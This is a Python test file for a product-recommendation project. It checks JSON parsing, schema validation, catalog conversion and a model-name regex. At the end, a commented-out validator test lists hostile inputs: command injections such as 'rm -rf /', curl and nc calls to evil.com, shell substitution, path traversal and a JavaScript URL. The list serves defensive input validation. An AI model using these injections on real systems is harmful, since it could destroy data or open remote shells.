import os
import re
os.environ["NEST_ASYNCIO"] = "0"
import json
import json_repair
import jsonschema
from dataclasses import asdict
from random import SystemRandom
from bitrecs.llms.prompt_factory import PromptFactory
from bitrecs.commerce.product import CatalogProvider, Product, ProductFactory
from bitrecs.validator.reward import CatalogValidator, validate_result_schema
from bitrecs.utils.constants import RE_MODEL_NAME
safe_random = SystemRandom()


def test_basic_parsing():
    single_rec = '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}'
    single_rec2 = '{"sku": "24-UG02", "name": "Pursuit Lumaflex&trade; Tone Band", "price": "16.04"}'
    single_rec3 = '{"sku": "24-MG05", "name": "Cruise Dual Analog Watch", "price": "55.90"}'
    multi_rec = [single_rec, single_rec2, single_rec3]
    final_recs = [json.loads(idx.replace("'", '"')) for idx in multi_rec]
    print(final_recs)    
    assert len(multi_rec) == len(final_recs)    


def test_basic_parsing2():
    results =  ['{"sku": "24-WG088", "name": "Sprite Foam Roller"}',
                '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick"}',
                '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band"}',
                '{"sku": "24-UG05", "name": "Go-Get\'r Pushup Grips"}',
                '{"sku": "24-UG02", "name": "Pursuit Lumaflex&trade; Tone Band"}',
                '{"sku": "24-UG07", "name": "Dual Handle Cardio Ball"}']

    final = []
    for idx in results:        
        fixed1 = json_repair.repair_json(idx, logging=False)  
        print(f"fixed: {fixed1}")
        product = json_repair.loads(fixed1)        
        final.append(product)    
    print("FINAL RESULTS")
    print(final)
    assert len(results) == len(final)


def test_schema_validation():
    broken_json =  ['{"sku": "24-WG088", "name": "Sprite Foam Roller"}',
                    '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick"}',
                    '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band"}',
                    '{"sku": "24-UG05", "name": "Go-Get\'r Pushup Grips"}',
                    '{"sku": "24-UG02", "name": "Pursuit Lumaflex&trade; Tone Band"}',
                    '{"sku": "24-UG07", "name": "Dual Handle Cardio Ball"}']
    
    partial_json =  ['{"sku": "24-WG088", "name": "Sprite Foam Roller"}',
                     '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": 5.00}',
                     '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band"}',
                     '{"sku": "24-UG05", "name": "Go-Get\'r Pushup Grips"}',
                     '{"sku": "24-UG02", "name": "Pursuit Lumaflex&trade; Tone Band"}',
                     '{"sku": "24-UG07", "name": "Dual Handle Cardio Ball", "price": "19"}']
    
    good_json =  ['{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}', 
                  '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                  '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32.0"}', 
                  '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19.11"}', 
                  '{"sku": "24-UG05", "name": "Go-Get\'r Pushup Grips", "price": "19.00"}', 
                  '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']
    
    schema = {
        "type": "object",
        "properties": {
            "sku": {"type": "string"},
            "name": {"type": "string"},
            "price": {"type": "string"}
        },
        "required": ["sku", "name", "price"]
    }

    broken_count = 0
    for item in broken_json:
        try:
            thing = json_repair.loads(item)
            jsonschema.validate(thing, schema)
            broken_count += 1
        except json.decoder.JSONDecodeError as e:            
            continue
        except jsonschema.exceptions.ValidationError as e:            
            continue
    #print(broken_count)
    assert broken_count == 0

    partial_count = 0
    for item in partial_json:
        try:
            thing = json_repair.loads(item)
            jsonschema.validate(thing, schema)
            partial_count += 1
        except json.decoder.JSONDecodeError as e:            
            continue
        except jsonschema.exceptions.ValidationError as e:            
            continue
    
    assert partial_count == 1


    good_count = 0
    for item in good_json:
        try:
            thing = json_repair.loads(item)
            jsonschema.validate(thing, schema)
            good_count += 1
        except json.decoder.JSONDecodeError as e:            
            continue
        except jsonschema.exceptions.ValidationError as e:            
            continue

    assert good_count == len(good_json)


def test_load_1k_raw():
    rows = []
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()
        rows = json_repair.loads(data)    
    print(f"loaded {len(rows)} records")
    assert len(rows) == 1000


def test_load_5k_raw():
    rows = []
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_5000.json", "r") as f:
        data = f.read()
        rows = json_repair.loads(data)    
    print(f"loaded {len(rows)} records")
    assert len(rows) == 5000


def test_parse_1k_into_products():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.try_parse_context(data)
    print(f"loaded {len(products)} records")    
    assert len(products) == 1000


def test_parse_5k_into_products():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_5000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.try_parse_context(data)
    print(f"loaded {len(products)} records")    
    assert len(products) == 5000


def test_parse_20k_into_products():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_20000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.try_parse_context(data)
    print(f"loaded {len(products)} records")    
    assert len(products) == 20000


def test_parse_1k_products_have_missing_fields():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.try_parse_context(data)
    print(f"loaded {len(products)} records")       
    assert len(products) == 1000

    broken = False
    for product in products:
        if not hasattr(product, "sku"):
            broken = True
            break
        if not hasattr(product, "name"):
            broken = True
            break
        if not hasattr(product, "price"):
            broken = True
            break

    assert broken # should be broken

            
def test_convert_1k_amazon_to_bitrecs():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)
    print(f"converted {len(products)} records")       
    assert len(products) == 907

    dupe_count = ProductFactory.get_dupe_count(products)
    print(f"dupe count: {dupe_count}")
    assert dupe_count == 61

    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False


def test_convert_5k_amazon_to_bitrecs():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_5000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)
    print(f"converted {len(products)} records")       
    assert len(products) == 4544

    dupe_count = ProductFactory.get_dupe_count(products)
    print(f"dupe count: {dupe_count}")
    assert dupe_count == 416

    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False


def test_convert_20k_amazon_to_bitrecs():
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_20000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)
    print(f"converted {len(products)} records")       
    assert len(products) == 18088

    dupe_count = ProductFactory.get_dupe_count(products)
    print(f"dupe count: {dupe_count}")
    assert dupe_count == 3324

    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False


def test_convert_1k_woocommerce_to_bitrecs():
    woo_catalog = "./tests/data/woocommerce/product_catalog.csv" #2038 records
    catalog = ProductFactory.tryload_catalog_to_json(CatalogProvider.WOOCOMMERCE, woo_catalog)
    products = ProductFactory.convert(catalog, CatalogProvider.WOOCOMMERCE)
    print(f"converted {len(products)} records")       
    assert len(products) == 2038

    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False


def test_convert_1k_shopify_to_bitrecs():
    shopify_catalog = "./tests/data/shopify/electronics/shopify_products.csv" #824 records
    catalog = ProductFactory.tryload_catalog_to_json(CatalogProvider.SHOPIFY, shopify_catalog)
    products = ProductFactory.convert(catalog, CatalogProvider.SHOPIFY)
    print(f"converted {len(products)} records")
    assert len(products) == 359
    
    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False

    dupe_count = ProductFactory.get_dupe_count(products)
    print(f"dupe count: {dupe_count}")
    assert dupe_count == 9

    products = ProductFactory.dedupe(products)
    assert len(products) == 350
  

def test_convert_30k_walmart_to_bitrecs():
    walmart_catalog = "./tests/data/walmart/wallmart_30k_kaggle_trimmed.csv" #30k records
    catalog = ProductFactory.tryload_catalog_to_json(CatalogProvider.WALMART, walmart_catalog)
    products = ProductFactory.convert(catalog, CatalogProvider.WALMART)
    print(f"converted {len(products)} records")
    assert len(products) == 30000
    
    for product in products:
        if not hasattr(product, "sku"):
            assert False
        if not hasattr(product, "name"):
            assert False
        if not hasattr(product, "price"):
            assert False

    dupe_count = ProductFactory.get_dupe_count(products)
    print(f"dupe count: {dupe_count}")
    assert dupe_count == 0

    products = ProductFactory.dedupe(products)
    assert len(products) == 30000

    sample = safe_random.sample(products, 10)
    for p in sample:
        print(f"{p.sku} - {p.name} - {p.price}")    
    


def test_product_factory_parse_all():
    products =  ['{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']
    context = json.dumps(products)
    result = ProductFactory.try_parse_context(context)
    assert len(result) == 5


def test_product_factory_parse_all_dataclass():
    products =  ['{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"skuere": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']
    context = json.dumps(products)
    print(f"context: {context}")  

    #regular json loads
    result : list[Product] = ProductFactory.try_parse_context(context)    
    assert len(result) == 5   

    #strict schmea  json loads
    result : list[Product] = ProductFactory.try_parse_context_strict(context)
    assert len(result) == 0 #sku not present in last record, entire context is rejected


def test_product_factory_parse_all_dataclass_from_dict():
    products =  [{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"},
                 {"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"},
                 {"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"},
                 {"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"},
                 {"skuere": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}]
    context = json.dumps(products)
    print(f"context: {context}")

    #regular json loads
    result : list[Product] = ProductFactory.try_parse_context(context)    
    assert len(result) == 5 

    #strict schmea  json loads
    result : list[Product] = ProductFactory.try_parse_context_strict(context)
    assert len(result) == 4 #sku not present in last record



def test_products_must_all_have_sku():
    products =  ['{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']

    sku_check = ProductFactory.check_all_have_sku(products)
    print(f"sku check: {sku_check}")
    assert sku_check == True


def test_products_must_all_have_sku_case_sensitive():
    products =  ['{"SkU": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']

    sku_check = ProductFactory.check_all_have_sku(products)
    print(f"sku check: {sku_check}")
    assert sku_check == False
    
    
def test_products_must_all_have_sku_no_upper_allowed():
    products =  ['{"SKU": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"sku": "24-WG088", "name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']

    sku_check = ProductFactory.check_all_have_sku(products)
    print(f"sku check: {sku_check}")
    assert sku_check == False   
    

def test_products_missing_sku_error():
    products =  ['{"sku": "24-UG03", "name": "Harmony Lumaflex&trade; Strength Band Kit", "price": "22"}',
                 '{"name": "Sprite Foam Roller", "price": "19"}',
                 '{"sku": "24-MB04", "name": "Strive Shoulder Pack", "price": "32"}',
                 '{"sku": "24-UG01", "name": "Quest Lumaflex&trade; Band", "price": "19"}',
                 '{"sku": "24-WG084", "name": "Sprite Foam Yoga Brick", "price": "5"}']

    sku_check = ProductFactory.check_all_have_sku(products)
    print(f"sku check: {sku_check}")
    assert sku_check == False



def test_schema_validation_broken_testnet_json_03_03_2025():
    broken_json = ['{\'sku\': \'8772908155104\', \'name\': \'10" Table Top Selfie LED Lamp\', \'price\': \'46.74\', \'reason\': \'test\'}', 
    "{'sku': '8772909269216', 'name': 'Knock Knock Video Doorbell WiFi Enabled', 'price': '40.29', 'reason': 'test'}", 
    "{'sku': '8772908450016', 'name': 'Galaxy Starry Sky Projector Rotating', 'price': '90.34', 'reason': 'test'}", 
    "{'sku': '8761138839776', 'name': 'beFree Sound Color LED Dual Gaming Speakers', 'price': '84.42', 'reason': 'test'}", 
    "{'sku': '8772908384480', 'name': 'Universal Wireless Charging Stand for Iphone Apple Watch Airpods', 'price': '40.33', 'reason': 'test'}", 
    '{\'sku\': \'8761139331296\', \'name\': \'Impress 16" Oscillating Stand Fan (black) IM-725B\', \'price\': \'56.91\', \'reason\': \'test\'}']

    is_valid = validate_result_schema(6, broken_json)
    assert is_valid == True
 

def test_schema_validation_broken_testnet_json_03_03_2025_2():
    broken_json = ['{\'sku\': \'8772908155104\', \'name\': \'10" Table Top Selfie LED Lamp\', \'price\': \'46.74\'}', 
    "{'sku': '8772909269216', 'name': 'Knock Knock Video Doorbell WiFi Enabled', 'price': '40.29'}", 
    "{'sku': '8772908450016', 'name': 'Galaxy Starry Sky Projector Rotating', 'price': '90.34'}", 
    "{'sku': '8761138839776', 'name': 'beFree Sound Color LED Dual Gaming Speakers', 'price': '84.42'}", 
    "{'sku': '8772908384480', 'name': 'Universal Wireless Charging Stand for Iphone Apple Watch Airpods', 'price': '40.33'}", 
    '{\'sku\': \'8761139331296\', \'name\': \'Impress 16" Oscillating Stand Fan (black) IM-725B\', \'price\': \'56.91\'}']

    context = json.dumps(broken_json)
    products = ProductFactory.try_parse_context_strict(context)
    print(products)
    assert len(products) == 0
    

def test_schema_validation_broken_testnet_json_03_03_2025_4():
    broken_json = ['{\'sku\': \'8761139331296\', \'name\': \'Impress 16" Oscillating Stand Fan (black) IM-725B\', \'price\': \'56.91\'}', 
                   "{'sku': '8772909105376', 'name': 'Wireless Magnetic Charger And Power Bank For iPhone 12', 'price': '56.42'}", 
                   "{'sku': '8761139921120', 'name': 'HD 1080P Camera 360° Panoramic PTZ Wireless Wifi Camera', 'price': '57.33'}", 
                   "{'sku': '8772908712160', 'name': 'Watermelon iPhone Case', 'price': '24.17'}", 
                   "{'sku': '8761139101920', 'name': 'beFree Sound 2.0 Computer Gaming Speakers with LED RGB Lights', 'price': '87.01'}", 
                   "{'sku': '8772909269216', 'name': 'Knock Knock Video Doorbell WiFi Enabled', 'price': '40.29'}"]

    context = json.dumps(broken_json)
    products = ProductFactory.try_parse_context_strict(context)
    print(products)
    assert len(products) == 0
    


def test_strict_parser_rejects_malformed_json_quotes():
    problematic_json = ['{\'sku\': \'8772908155104\', \'name\': \'10" Table Top Selfie LED Lamp\', \'price\': \'46.74\'}', 
    "{'sku': '8772909269216', 'name': 'Knock Knock Video Doorbell WiFi Enabled', 'price': '40.29'}", 
    "{'sku': '8772908450016', 'name': 'Galaxy Starry Sky Projector Rotating', 'price': '90.34'}", 
    "{'sku': '8761138839776', 'name': 'beFree Sound Color LED Dual Gaming Speakers', 'price': '84.42'}", 
    "{'sku': '8772908384480', 'name': 'Universal Wireless Charging Stand for Iphone Apple Watch Airpods', 'price': '40.33'}", 
    '{\'sku\': \'8761139331296\', \'name\': \'Impress 16" Oscillating Stand Fan (black) IM-725B\', \'price\': \'56.91\'}']
    
    context = json.dumps(problematic_json)
    print(context)

    products = ProductFactory.try_parse_context_strict(context)
    
    # Verify specific rejections
    assert len(products) < len(problematic_json)
    
    # Verify surviving products have proper formatting
    for product in products:
        assert '"' not in product.sku  # No quotes in actual data
        assert "'" not in product.sku


def test_schema_validation_missing_reasoning():
    broken_json = ["{'sku': '8772909269216', 'name': 'Knock Knock Video Doorbell WiFi Enabled', 'price': '40.29', 'reason': 'test'}", 
    "{'sku': '8772908450016', 'name': 'Galaxy Starry Sky Projector Rotating', 'price': '90.34', 'reason': 'test'}", 
    "{'sku': '8761138839776', 'name': 'beFree Sound Color LED Dual Gaming Speakers', 'price': '84.42', 'reason': 'test'}", 
    "{'sku': '8772908384480', 'name': 'Universal Wireless Charging Stand for Iphone Apple Watch Airpods', 'price': '40.33'}"]
    is_valid = validate_result_schema(4, broken_json)
    assert is_valid == False


def test_compact_product_json():   
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)    
    
    assert len(products) == 907
    context = json.dumps([asdict(products) for products in products])    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 40093 == tc

    context = json.dumps([asdict(products) for products in products], separators=(',', ':'))    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 34652 == tc

    p = json.loads(context)
    assert len(p) == 907


def test_compact_product_json():   
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)    
    
    assert len(products) == 907
    context = json.dumps([asdict(products) for products in products])    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 40300 == tc

    context = json.dumps([asdict(products) for products in products], separators=(',', ':'))    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 34859 == tc

    p = json.loads(context)
    assert len(p) == 907


def test_compact_product_json_20k():   
    with open("./tests/data/amazon/fashion/amazon_fashion_sample_20000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)    
    
    assert len(products) == 18088
    context = json.dumps([asdict(products) for products in products])    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 803791 == tc

    context = json.dumps([asdict(products) for products in products], separators=(',', ':'))    
    tc = PromptFactory.get_token_count(context)
    print(f"token count: {tc}")
    assert 695267 == tc

    p = json.loads(context)
    assert len(p) == 18088


def test_catalog_validator():
    #"PILOT Dr. Grip Refillable & Retractable Gel Ink Rolling Ball Pen, Fine Point, Blue Barrel, Black Ink, Single Pen (36260)", 
    # "images": [], "asin": "B00006IEBU", "parent_asin": "B08CH1V4DG", "
    with open("./tests/data/amazon/office/amazon_office_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)
    catalog_validator = CatalogValidator(products)

    sku = "B00006IEBU"
    is_valid = catalog_validator.validate_sku(sku)
    assert is_valid == True

    sku = "B00006IEBUe"
    is_valid = catalog_validator.validate_sku(sku)
    assert is_valid == False
    

def test_find_name_by_sku():
    with open("./tests/data/amazon/office/amazon_office_sample_1000.json", "r") as f:
        data = f.read()    
    products = ProductFactory.convert(data, CatalogProvider.AMAZON)    
    products = ProductFactory.dedupe(products)
    prodcut_json = json.dumps([asdict(product) for product in products])

    sku = "B01MTP6Q01"
    match = ProductFactory.find_sku_name(sku, prodcut_json)
    print(f"match: {match}")
    assert match == "Giant Print Check Register Set of 2"


def test_model_name_re():
    valid_models = [        
        'somemodel',
        'openai/gpt-4o-mini-search-preview',
        'tencent/hunyuan-a13b-instruct:free',
        'model_custom',
        'gemini2.1',
        'chat-gpt',
        'openai/gpt-4.1',
        'openai/gpt-4.1:latest',
        'qwen2.5-coder:latest',
        'openai/gpt-4o-2024-05-13',
        'openai/gpt-3.5-turbo-1106',
        'anthropic/claude-3.7-sonnet:thinking',
        'gemini-2.5-flash-lite-preview-06-17',
        'deepseek/deepseek-chat-v3-0324',
        'NousResearch/DeepHermes-3-Mistral-24B-Preview',
        'openai/gpt-4ABC',
        'meta-llama/llama-4-scout',
        'meta-llama/Llama-4-Scout-17B-16E'
    ]
    for model in valid_models:
        claned = RE_MODEL_NAME.sub("", model)
        print(f"model: {model} - cleaned: {claned}")
        assert claned == model, f"Model '{model}' did not match the regex correctly"





# def test_model_name_validation():
#     valid_models = [        
#         'openai/gpt-4o-mini-search-preview',
#         'tencent/hunyuan-a13b-instruct:free',
#         'model_custom',
#         'gemini2.1',
#         'chat-gpt',     
#         'openai/gpt-4.1',
#         'openai/gpt-4.1:latest',
#         'qwen2.5-coder:latest',
#         'openai/gpt-4o-2024-05-13',
#         'openai/gpt-3.5-turbo-1106',
#         'anthropic/claude-3.7-sonnet:thinking',
#         'gemini-2.5-flash-lite-preview-06-17',
#         'deepseek/deepseek-chat-v3-0324',
#         'NousResearch/DeepHermes-3-Mistral-24B-Preview',
#         'openai/gpt-4ABC',
#         'meta-llama/llama-4-scout'
#     ]

#     invalid_models = [
#         'some model',
#         # Structure violations
#         'openai//gpt-4',  # Double slash
#         'openai/gpt-4:tag:extra',  # Multiple colons
#         'openai/gpt-4::extra',  # Double colon
#         '/model',  # Starts with slash
#         'openai/',  # Ends with slash
#         'openai/gpt-4/',  # Ends with slash
#         'openai/gpt-4:',  # Ends with colon
        
#         # Invalid characters
#         'openai/gpt-4!@#',   # Special symbols
#         'openai/gpt-4%41',   # URL encoding
#         'openai/gpt-4&#65;', # HTML entities  
#         'openai/gpt-4<>[]',  # Brackets
#         'openai/gpt-4"\'\\', # Quotes and escapes
#         'openai/gpt-4~`|',   # Tilde, backtick, pipe
#         'openai/gpt-4+=',    # Plus and equals
#         'openai/gpt-4 space', # Spaces
#         'openai/gpt-4\t',    # Tab
#         'openai/gpt-4\n',    # Newline
#         'openai/gpt-4\r',    # Carriage return
        
#         # Control characters
#         'openai/gpt-4\x00',  # NULL
#         'openai/gpt-4\x01',  # Start of heading
#         'openai/gpt-4\x08',  # Backspace
#         'openai/gpt-4\x0c',  # Form feed
#         'openai/gpt-4\x1f',  # Unit separator
#         'openai/gpt-4\x7f',  # DEL
        
#         # Length violations
#         'a' * 200,  # Too long overall
#         'openai/' + 'a' * 150,  # Model name too long
#         'openai/gpt-4:' + 'a' * 100,  # Tag too long
#         'a' * 60 + '/model',  # Provider too long
        
#         # Empty/whitespace
#         '',  # Empty string
#         ' ',  # Single space
#         '   ',  # Multiple spaces
        
#         # Unicode attacks
#         'openai/gpt-4\u200b',  # Zero-width space
#         'openai/gpt-4\u2060',  # Word joiner
#         'openai/gpt-4\ufeff',  # BOM
#         'оpenai/gpt-4',  # Cyrillic 'о'
#         'openai/ɡpt-4',  # Script 'ɡ'
#         'openai/gpt-４',  # Full-width '４'
        
#         # Path traversal  
#         'openai/../gpt-4',  # Parent directory
#         'openai/./gpt-4',   # Current directory
#         'openai/gpt-4/../../etc',  # Multi-level traversal
        
#         # URL schemes
#         'http://evil.com',  # HTTP
#         'https://evil.com', # HTTPS
#         'javascript:alert(1)', # JavaScript
#         'data:text/html,<script>', # Data URI
        
#         # Command injection
#         'openai/gpt-4; rm -rf /',  # Command separator
#         'openai/gpt-4 && curl evil.com',  # Command chaining
#         'openai/gpt-4 | nc evil.com 4444',  # Pipe
#         'openai/gpt-4 `whoami`',  # Command substitution
#         'openai/gpt-4 $(whoami)',  # Command substitution        
        
#         # Invalid UTF-8
#         'openai/gpt-4\xff\xfe',  # Invalid UTF-8
#         'openai/gpt-4\xc0\x80',  # Overlong encoding
#     ]
    
#     pattern = RE_MODEL
#     for model in valid_models:
#         # Check for control characters and whitespace first
#         if any(ord(c) < 32 or ord(c) == 127 for c in model) or ' ' in model:
#             assert False, f"Model '{model}' contains invalid characters"
        
#         match = re.match(pattern, model)
#         assert match is not None, f"Model '{model}' should be valid but was rejected"
#         print(f"Model '{model}' is valid.")    
    
#     for model in invalid_models:        
#         has_control_chars = any(ord(c) < 32 or ord(c) == 127 for c in model) or ' ' in model
#         match = re.match(pattern, model)
#         assert match is None, f"Model '{model}' should be invalid but was accepted"
        
#         # Model should be invalid if it has control chars OR doesn't match pattern
#         assert has_control_chars or match is None, f"Model '{model}' should be invalid but was accepted"
#         print(f"Model '{model}' is correctly rejected.")    
    